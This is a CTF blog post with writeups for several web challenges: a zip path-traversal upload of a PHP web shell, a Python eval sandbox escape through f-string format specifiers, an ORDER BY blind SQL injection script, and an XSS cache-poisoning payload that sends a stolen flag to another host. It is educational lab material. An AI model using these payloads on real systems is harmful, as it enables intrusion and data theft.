---
title: "SpiritCTF 2026: Web Challenge Design and Writeups"
description: "My Web challenges for SpiritCTF 2026, along with writeups for selected challenges from the competition."
publishDate: 2026-10-20T13:50:31.584Z
tags:
  - "ctf"
  - "web"
heroImage:
  src: ../../blog/spiritctf-2026-web-writeup/spiritctf-2026-web-writeup.assets/city-light.jpg
  color: "#282838"
  alt: "SpiritCTF 2026: Web Challenge Design and Writeups"
language: 'en'
draft: false
slug: spiritctf-2026-web-writeup
---

> This was an in-person competition with no internet access, and most of the players were fairly new to CTFs. I think I made the challenges a bit too hard.

<github-card data-repo="residream/2026-SpiritCTF-Web" data-description="My Web challenges for SpiritCTF 2026, with source code, Docker build files, and writeups."><a href="https://github.com/residream/2026-SpiritCTF-Web">2026 SpiritCTF · Web challenge source code and writeups</a></github-card>

## Magical Request Headers

A warm-up challenge written by a senior student. Just change the HTTP method and headers as instructed. If I remember correctly, the final request used POST, with User-Agent set to Spirit and Referer set to JLU.

## login？

> This was supposed to be my warm-up challenge (?), but it only got three solves. The next three challenges got none. Well then.

The site opens on a login page. Trying to log in seems to do nothing.

Inspecting the traffic reveals the response returned after login:

```http
HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Date: Fri, 16 Oct 2026 05:49:32 GMT
Location: /login.php
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.35
Content-Length: 554

<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <title>素材导入后台</title>
</head>
<body>
  <h1>素材导入后台</h1>
  <p>上传 ZIP，自动解压归档并返回导入报告。</p>
  <form action="/upload_aa99bc42bc4e.php" method="post" enctype="multipart/form-data">
    <p><label>选择压缩包：<input type="file" name="archive" accept=".zip" required></label></p>
    <p><button type="submit">上传并解压</button></p>
  </form>
  <p><a href="/make_sample.py" download>下载示例脚本</a></p>
</body>
</html>
```

The response body leaks the admin page, revealing `/upload_aa99bc42bc4e.php` for uploading archives and `/make_sample.py` for downloading a sample script.

The sample script contains:

```python
import zipfile

#小 r 感觉直接用脚本生成示例压缩包然后 curl 上传更方便呢
#curl http://localhost:3000 -F "archive=@sample.zip"
with zipfile.ZipFile("sample.zip", "w") as z:
    z.writestr("notes.txt", "这是示例素材包。\n系统会保留内部目录结构进行解压归档。\n")
    z.writestr("images/cover.txt", "封面占位")
```

I even included the curl command for uploading the file (

Generate the sample archive and upload it. The response is:

```json
{
    "id": "f21c77",
    "status": "completed",
    "workspace": "/var/www/storage/f21c77",
    "files": [
        {
            "entry": "notes.txt",
            "stored_as": "/var/www/storage/f21c77/notes.txt",
            "size": 80,
            "status": "written"
        },
        {
            "entry": "images/cover.txt",
            "stored_as": "/var/www/storage/f21c77/images/cover.txt",
            "size": 12,
            "status": "written"
        }
    ]
}
```

With this much detail in the response, I tried placing a one-line PHP web shell in an archive and using path traversal during extraction to reach RCE.

```python
import zipfile

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("../../html/evil.php", "<?php system($_GET['c']); ?>")
```

```
Warning: Undefined array key "c" in /var/www/html/evil.php on line 1

Deprecated: system(): Passing null to parameter #1 ($command) of type string is deprecated in /var/www/html/evil.php on line 1

Fatal error: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/evil.php:1 Stack trace: #0 /var/www/html/evil.php(1): system('') #1 {main} thrown in /var/www/html/evil.php on line 1
```

RCE works, and the flag is in the root directory:

```
/evil.php?c=cat%20/flag

SpiritCTF{IOGin-10okS-I0CkEd-6Ut_zlP_5llPS-iNTo-DocrOoT0}
```

## gpa-calculator

The challenge description says:

```
Little r really "loves" JLU's GPA system, especially its amazing habit of not rounding decimal results. It always finds a way to give him a "surprise".
Having just started learning Python, he wrote a GPA calculator and deployed it to a server. It supports manual grade entry, xlsx transcript imports, and custom report formats.
To stop people from submitting arbitrary expressions, little r "carefully" added a checker (?).
Can you find the flaw?
```

It is a GPA calculator, and the expression checker is probably the part to focus on.

### Reviewing the Code

Extracting the attachment reveals a GPA Calculator application written in Flask.

The `Dockerfile` sets up the challenge, installs dependencies such as Flask, gunicorn, and defusedxml, and runs the service as a non-root user. Its startup command is:

```dockerfile
CMD ["gunicorn", "--config", "gunicorn.conf.py", "app:create_app()"]
```

So the web application's entry point is `create_app()` in `app.py`.

`entrypoint.sh`:

```sh
flag_value=$FLAG
unset FLAG

umask 077
printf '%s' "$flag_value" > /tmp/flag
```

When the container starts, it writes the `FLAG` environment variable to `/tmp/flag` and then unsets the variable. The goal is therefore to find a way to read `/tmp/flag`.

`compose.yml` is the Docker Compose configuration for local testing, exposing port `3000`.

`app.py`:

This is the Flask entry point, which defines several routes:

```python
@app.get("/")
def index():
    return render_template("index.html", default_expression=DEFAULT_EXPRESSION)
```

The home page renders the frontend and passes in a default expression:

```python
DEFAULT_EXPRESSION = 'f"加权 GPA：{gpa:.2f}\\n平均分：{avg_score:.2f}\\n总学分：{credits:.1f}\\n课程数：{course_count}"'
#小 r 发现这里还可以写 f"加权 GPA：{gpa:.{1+1}f}\\n平均分：{avg_score:.{1+1}f}\\n总学分：{credits:.{1+1}f}\\n课程数：{course_count}"
#既然这里可以执行参数，那这样以后改成可选精确值就方便多了呀！
#不过这种事情还是留给以后吧！
MAX_UPLOAD_BYTES = 2 * 1024 * 1024
```

This means that the "custom report format" feature essentially lets the user submit a Python expression.

And yes, I put a comment right there pointing out that expressions can run inside the format string (

Next, look at `/api/calculate`:

```python
@app.post("/api/calculate")
def calculate():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return jsonify({"ok": False, "error_type": "BadRequest", "error": "json object required"}), 400

    try:
        courses = validate_courses(data.get("courses"))
        expression = data.get("expression") or DEFAULT_EXPRESSION
        summary = calculate_summary(courses)
        context = build_expression_context(summary)
    except ValueError as exc:
        return jsonify({"ok": False, "error_type": "BadRequest", "error": str(exc)}), 400

    result = run_expression(expression, context)
    status = 200 if result["ok"] else 400
    return jsonify({"courses": courses, "summary": summary, **result}), status
```

It accepts the submitted course data and `expression`, calculates the GPA, then passes the expression to `run_expression()`.

`gpa.py`:

This handles the GPA calculations, including course validation, converting grades to grade points, and weighted averages. For example:

```python
GRADE_POINTS = {
    "优秀": 4.0,
    "良好": 3.3,
    "中等": 2.3,
    "及格": 1.3,
    "不及格": 0.0
}

GRADE_SCORES = {
    "优秀": 95.0,
    "良好": 85.0,
    "中等": 75.0,
    "及格": 65.0,
    "不及格": 0.0,
}
```

`build_expression_context()` turns the results into variables that the expression can use:

```python
def build_expression_context(summary):
    return {
        "gpa": float(summary["gpa"]),
        "avg_score": float(summary["avg_score"]),
        "credits": float(summary["credits"]),
        "course_count": int(summary["course_count"]),
        "student_name": "guest",
    }
```

Under normal circumstances, the expression can only directly reference `gpa`, `avg_score`, `credits`, `course_count`, and `student_name`.

`xlsx_import.py`:

This parses uploaded xlsx transcripts, reads fields such as course names, credits, and grades, and converts them into a list of courses.

The file is fairly long, but most of it is application logic supporting the transcript import feature mentioned in the description.

`runner.py`:

```python
def run_expression(expression, context):
    try:
        tree = parse_and_check(expression, context.keys())
        code = compile(tree, "<report>", "eval")
        namespace = dict(context)
        namespace["report"] = ReportFormatter(context.get("student_name", "guest"))
        value = eval(code, {"__builtins__": {}}, namespace)
        return {"ok": True, "result": str(value)[:MAX_OUTPUT]}
    except ExpressionRejected as exc:
        return {"ok": False, "error_type": "Rejected", "error": str(exc)}
    except Exception as exc:
        return {"ok": False, "error_type": exc.__class__.__name__, "error": str(exc)[:MAX_OUTPUT]}
```

The flow is straightforward:

1. Check the expression with `parse_and_check()`.
2. If it passes, call `compile()`.
3. Build the execution namespace.
4. Add a `report` object.
5. Evaluate the expression with `eval()`.

Although the globals passed to `eval()` contain an empty `__builtins__`:

```python
eval(code, {"__builtins__": {}}, namespace)
```

There may still be a way out if we can follow an object chain back to Python's globals or built-in functions.

The injected `ReportFormatter` is defined in `report.py`:

```python
class ReportFormatter:
    def __init__(self, student="guest"):
        self.student = student
```

The class looks like a simple report-rendering helper, but `runner.py` adds an instance to the expression's namespace:

```python
namespace["report"] = ReportFormatter(context.get("student_name", "guest"))
```

That makes `report` accessible during evaluation. Python function objects can normally access their defining module's global namespace through `__globals__`, so `report` looks like a promising starting point.

Finally, the actual checker in `checker.py`:

```python
MAX_EXPRESSION_LENGTH = 2048

BLOCK_WORDS = (
    "__globals__",
    "__builtins__",
    "__subclasses__",
    "__import__",
)
```

It first limits the expression length and blocks a few sensitive strings.

Writing `__globals__`, `__builtins__`, `__subclasses__`, or `__import__` directly will be rejected.

Now look at the allowed AST nodes:

```python
ALLOWED_NODES = {
    ast.Expression,
    ast.Constant,
    ast.Name,
    ast.Load,
    ast.JoinedStr,
    ast.FormattedValue,
    ast.BinOp,
    ast.UnaryOp,
    ast.Add,
    ast.Sub,
    ast.Mult,
    ast.Div,
    ast.FloorDiv,
    ast.Mod,
    ast.Pow,
    ast.UAdd,
    ast.USub,
}
```

`Call`, `Attribute`, and `Subscript` are all missing from the allowlist. Normally, this means no function calls, attribute access, or subscripting.

For example, neither of these expressions should pass:

```python
open("/tmp/flag").read()
```

```python
report.__init__
```

They produce AST nodes such as `Call` and `Attribute`.

Here is the actual checking logic:

```python
class ReportExpressionChecker(ast.NodeVisitor):
    def __init__(self, allowed_names):
        self.allowed_names = set(allowed_names)

    def visit(self, node):
        if type(node) not in ALLOWED_NODES:
            raise ExpressionRejected(f"{type(node).__name__} is not allowed")
        return super().visit(node)

    def visit_Name(self, node):
        if node.id not in self.allowed_names:
            raise ExpressionRejected(f"name {node.id!r} is not available")

    def visit_Constant(self, node):
        if not isinstance(node.value, (int, float, str)):
            raise ExpressionRejected(f"constant {node.value!r} is not allowed")

    def visit_FormattedValue(self, node):
        self.visit(node.value)
```

`visit()` checks whether the node type is allowed, while `visit_Name()` checks whether a variable name is available.

The checker is called in `runner.py` like this:

```python
tree = parse_and_check(expression, context.keys())
```

Here, `allowed_names` comes from `context.keys()`, which contains:

```
gpa
avg_score
credits
course_count
student_name
```

Notice that `report` is not on the list. It is only added to the execution namespace after the check:

```python
namespace = dict(context)
namespace["report"] = ReportFormatter(context.get("student_name", "guest"))
```

So directly referencing `report` in an expression should also be rejected.

Now for the important part:

```python
def visit_FormattedValue(self, node):
    self.visit(node.value)
```

This is where the vulnerability lies.

### Analyzing the Vulnerability

I originally wanted players to figure this out themselves, but before releasing the challenge I thought the trick might be a bit much, so I spelled it out in a comment. That apparently did not help much either (

Let's work through it anyway.

In a Python f-string, the contents of `{}` are represented by a `FormattedValue` node. For example:

```python
f"{gpa:.2f}"
```

Here, `gpa` is the value being formatted, and `.2f` is the format specifier, or `format_spec`.

In a more complex f-string, the format specifier can itself contain expressions:

```python
f"{gpa:{'.2f'.strip()}}"
```

The outer value is still `gpa`, but the format specifier also evaluates:

```python
'.2f'.strip()
```

In other words, expressions can appear inside an f-string's `format_spec` too.

The challenge's checker only visits:

```python
self.visit(node.value)
```

It checks the value being formatted without visiting `node.format_spec`.

An expression hidden inside `format_spec` therefore goes unseen by the AST checker.

A simple expression is enough to verify this:

```python
f"{gpa:{'.2f'.strip()}}"
```

`'.2f'.strip()` clearly contains both a function call and attribute access, which should normally be rejected as `Call` and `Attribute`. But because it sits inside `format_spec`, the checker never visits it, and it executes.

We can now put the exploit inside `format_spec`.

The goal is to read `/tmp/flag`. As shown earlier, `runner.py` adds a `report` object at runtime:

```python
namespace["report"] = ReportFormatter(...)
```

Since `report` is a `ReportFormatter` instance, we can follow its method object to the function's globals. The usual approach would be:

```python
report.__init__.__globals__
```

But the blocklist catches `__globals__`, so we need to construct the string by concatenation:

```python
'__glo' + 'bals__'
```

Instead of writing `report.__init__.__globals__` directly, we can use the function object's `__getattribute__` method:

```python
report.__init__.__getattribute__('__glo' + 'bals__')
```

Once we have the globals, we can retrieve `__builtins__`. That name is blocked too, so concatenate it as well:

```python
['__buil' + 'tins__']
```

Then retrieve `open` from the built-ins. We can split that string too:

```python
['op' + 'en']
```

The core expression for reading the flag is:

```python
report.__init__.__getattribute__('__glo'+'bals__')['__buil'+'tins__']['op'+'en']('/tmp/flag').read()
```

This cannot go directly at the outer level, where the AST checker would inspect it. It needs to be inside the f-string's `format_spec`:

```python
f"{0:{report.__init__.__getattribute__('__glo'+'bals__')['__buil'+'tins__']['op'+'en']('/tmp/flag').read()}}"
```

The payload has this structure:

```python
f"{0:{payload}}"
```

The outer value being formatted is `0`. The checker only inspects that ordinary constant, so it passes.

The inner `payload` is part of `format_spec`. The checker does not visit it, but Python still evaluates it at runtime.

The contents of `/tmp/flag` then become the format specifier. Since the flag is not a valid format specifier, an exception is raised, for example:

```
Invalid format specifier 'flag{fake_for_local_test}' for object of type 'int'
```

The application returns the exception message to the frontend:

```python
except Exception as exc:
    return {"ok": False, "error_type": exc.__class__.__name__, "error": str(exc)[:MAX_OUTPUT]}
```

So the flag is revealed in the error message.

Final payload:

```
f"{0:{report.__init__.__getattribute__('__glo'+'bals__')['__buil'+'tins__']['op'+'en']('/tmp/flag').read()}}"
```

Flag:

```
[ValueError] Invalid format specifier 'SpiritCTF{VISlt_F0rMATTEDvALu3-fORGoT_FoRm4T-SPec1b9d}' for object of type 'int'
```

## Secret Notes

> Second-order SQL injection with an ORDER BY blind oracle. Pretty fun, right (

dirsearch finds robots.txt:

```
User-agent: *
Disallow: /archive/deploy-notes.txt
```

Visiting the disclosed path reveals the login credentials:

```
秘密便签 / 部署交接记录
更新时间: 2026-10-15T11:13:02Z
登录账号: admin
临时登录密码: 019c8326ec8d1ffce65c5ec405cdefcd
登录密码与便签锁口令分别管理。
归档仅供部署交接，搜索引擎请勿收录。
```

We can now log in.

There is a private note, but it is locked behind a passphrase.

We can create new notes and choose how the notes on the main page are sorted.

The challenge includes source code, so let's review it.

```dockerfile
# 开发环境用于本地测试，线上部署为生产环境
ENV NODE_ENV=development
```

Local testing uses the development environment, while the competition deployment uses production. Building the local Docker version gives us the fixed password `local-dev-password` and flag `flag{fake_for_local_test}`, making it easier to test.

```js
const DEV_ADMIN_PASSWORD = 'local-dev-password';

function initialize(db, flag) {
  const adminPassword = process.env.ADMIN_PASSWORD
    || (process.env.NODE_ENV === 'production' ? null : DEV_ADMIN_PASSWORD);
```

```javascript
const flag = process.env.FLAG
  ?? (process.env.NODE_ENV === 'production' ? null : 'flag{fake_for_local_test}');
```

The flag is in the locked private note. Its passphrase is randomly generated and then hashed, so attacking the passphrase is not a practical route.

```javascript
const lockHash = hashPassword(crypto.randomBytes(16).toString('hex'));
```

However, the flag itself is stored in plaintext in `notes.body`:

```javascript
const secretNote = db.prepare('SELECT id FROM notes WHERE owner_id = ? AND system_note = ?').get(1, 1);
if (secretNote) {
  db.prepare('UPDATE notes SET body = ?, locked = ?, lock_hash = ? WHERE id = ?')
    .run(flag, 1, lockHash, secretNote.id);
} else {
  db.prepare(`INSERT INTO notes (owner_id, title, body, priority, locked, lock_hash, system_note, created_at)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?)`)
    .run(1, '私密记录', flag, 2, 1, lockHash, 1, '2026-10-06T14:48:00.000Z');
}
```

The `/notes` route inserts `sort_field` and `sort_dir` from the `users` table into the query without parameterization. SQL value placeholders cannot substitute for column identifiers or entire expressions in `ORDER BY`. This implementation uses string interpolation, so the important safeguard would be to allowlist the fields or expressions instead of inserting user input directly.

```javascript
router.get('/notes', requireLogin, (req, res) => {
  const { sort_field, sort_dir } = db.prepare('SELECT sort_field, sort_dir FROM users WHERE id = ?').get(req.currentUser.id);
  let list;
  try {
    list = db.prepare(
      `SELECT id, title, priority, locked, created_at
       FROM notes
       WHERE owner_id = ?
       ORDER BY ${sort_field} ${sort_dir}, id ASC`
    ).all(req.currentUser.id);
  } catch {
    if (wantsJson(req)) return res.status(400).json({ error: '排序偏好暂时不可用，请重新设置。' });
    return res.page('error', { title: '无法排列便签', nav: 'notes', code: 400, message: '排序偏好暂时不可用，请到排序设置中重新保存。', settingsLink: true }, 400);
  }
  if (wantsJson(req)) return res.json({ notes: list });
  res.page('notes', { title: '我的便签', nav: 'notes', notes: list, feedback: takeNotice(req) });
});
```

Tracing those values back reveals that `dir` is restricted to `asc` or `desc`, but `field` has no allowlist. It takes `req.body.sort_field.trim()` directly, checks that it is nonempty and within `SORT_FIELD_MAX`, and stops there.

```javascript
router.post('/settings', requireLogin, (req, res) => {
  const field = typeof req.body.sort_field === 'string' ? req.body.sort_field.trim() : '';
  const dir = req.body.sort_dir === 'asc' ? 'asc' : 'desc';
  if (!field || field.length > SORT_FIELD_MAX) {
    return res.page('settings', { title: '排序偏好', nav: 'settings', sortField: 'created_at', sortDir: 'desc', feedback: feedback('请选择排序方式。') }, 400);
  }
  db.prepare('UPDATE users SET sort_field = ?, sort_dir = ? WHERE id = ?').run(field, dir, req.currentUser.id);
  req.session.notice = '排序偏好已保存。';
  res.redirect(303, '/settings');
});
```

This creates a second-order injection: first store the input in `users`, then let the `/notes` query consume it and change the sort order. By comparing characters one at a time and watching the order on the main page, we can recover the plaintext flag.

Create two reference notes: a!@# first, giving it the smaller ID, then b!@#, giving it the larger ID. The injected SQL can look like this:

```sql
ORDER BY CASE WHEN ((SELECT unicode(substr(body,i,1)) FROM notes WHERE owner_id = 1 AND locked = 1 LIMIT 1) > j) THEN id ELSE -id END ASC, id ASC
```

By varying j, we can use binary search to find the character at position i, then repeat for the rest of the flag.

**exp.py**

```python
import requests

base = "https://edi4cx2o5onw.challenge.jlu-terminal.site"

s = requests.Session()

s.cookies.set("secret_notes.sid","s%3AkR4ogR85p4Tf86RQseSLtKcqYqHVQp2K.i3Vg6MSPTZAiFRB4xvqY3D9kLb3Slq9zKUUUL2Y6nFg")

def oracle(pos, mid):
    r1 = s.post(f"{base}/settings",
                data={
                    "sort_field":f"CASE WHEN ((SELECT unicode(substr(body,{pos},1)) FROM notes WHERE owner_id = 1 AND locked = 1 LIMIT 1) > {mid}) THEN id ELSE -id END",
                    "sort_dir":"asc"
                }
                )
    r2 = s.get(f"{base}/notes")

    return r2.text.find("a!@#")<r2.text.find("b!@#")


flag = ""

for pos in range(1,101):
    left, right = 0, 127

    while(left < right):
        mid = (left + right) // 2
        if oracle(pos, mid):
            left = mid + 1
        else:
            right = mid

    if left == 0:
        break

    flag += chr(left)
    print(flag)

print()
print("Flag:", flag)
```

```
S
Sp
Spi
Spir
Spiri
Spirit
SpiritC
SpiritCT
SpiritCTF
SpiritCTF{
SpiritCTF{0
SpiritCTF{0R
SpiritCTF{0Rd
SpiritCTF{0Rde
SpiritCTF{0RdeR
SpiritCTF{0RdeR_
SpiritCTF{0RdeR_B
SpiritCTF{0RdeR_By
SpiritCTF{0RdeR_By-
SpiritCTF{0RdeR_By-b
SpiritCTF{0RdeR_By-bL
SpiritCTF{0RdeR_By-bLl
SpiritCTF{0RdeR_By-bLln
SpiritCTF{0RdeR_By-bLlnD
SpiritCTF{0RdeR_By-bLlnD-
SpiritCTF{0RdeR_By-bLlnD-S
SpiritCTF{0RdeR_By-bLlnD-Sq
SpiritCTF{0RdeR_By-bLlnD-SqI
SpiritCTF{0RdeR_By-bLlnD-SqIi
SpiritCTF{0RdeR_By-bLlnD-SqIi6
SpiritCTF{0RdeR_By-bLlnD-SqIi6d
SpiritCTF{0RdeR_By-bLlnD-SqIi6d7
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77
SpiritCTF{0RdeR_By-bLlnD-SqIi6d775
SpiritCTF{0RdeR_By-bLlnD-SqIi6d7755
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559a
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559af
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559af}

Flag: SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559af}
```

## Xssr

> A browser-cache-and-XSS challenge written by a senior student. It even came with source code, which should give you an idea of the difficulty. It nearly broke my brain: you need to audit the browser's caching logic. Since I did not write this challenge, this section just contains the notes I took while solving it.

```
preview:

/
Returns preview.html

/render
Requires GET
Requires x-preview:1
Requires an html parameter

/flag
Requires admintoken
```

```
desk:

GET
/p/
Returns document.html (the saved document)

GET/POST
/inbox/
Writes url.search to the inbox
```

```
preview.html:

Fetches /render with x-preview set, then displays the result
```

```
browser:

The cache key uses the method and URL

get reads the cache; requires GET

put stores a response; requires GET, no no-store or no-cache in cache-control, and no set-cookie

After a cache hit, the browser immediately returns the cached response
```

```
The tricky part:

The bot carries admintoken, and review lets us send it to a page

save lets us write document.html with XSS, but it is hosted under desk; triggering it through review still leaves us on desk

So we need to trigger XSS under preview

/render?html= under preview is vulnerable to XSS, but requires x-preview

The preview home page also fetches /render..., but its empty sandbox attribute blocks scripts

When the bot visits preview.test/?html, scripts are blocked, but the response is still cached. A subsequent visit to preview.test/render?html hits that cache and immediately returns the response, allowing the XSS to execute under /render
```

Payload:

```html
<script>
const inner='<script>fetch("http://preview.test/flag",{credentials:"include"}).then(r=>r.text()).then(f=>new Image().src="http://desk.test/inbox/2fa7e3490cb09ab6b0bcde9b?flag="+encodeURIComponent(f))<\/script>'
const p=encodeURIComponent(inner)
window.open('http://preview.test?html='+p)
setTimeout(()=>{window.open('http://preview.test/render?html='+p);},2500)
</script>
```

```
[
  {
    "at": "2026-10-13T14:26:18.180Z",
    "query": "flag=SpiritCTF%7BC%40cHE_xS5-bYPA5523c57c90f35%7D",
    "body": ""
  }
]
```
